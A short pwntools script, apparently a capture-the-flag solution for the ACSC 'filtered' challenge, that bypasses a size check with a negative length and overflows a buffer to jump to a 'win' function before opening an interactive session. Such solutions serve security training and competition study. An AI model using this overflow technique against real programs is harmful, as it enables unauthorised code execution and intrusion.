from pwn import *
elf = ELF("./filtered")
# p = elf.process()
p = remote('filtered.chal.acsc.asia' ,9001)
win = elf.symbols['win']
p.sendlineafter("Size: ",b'-1')
p.sendlineafter("Data: ",b'a'*0x118+p64(win))
p.interactive()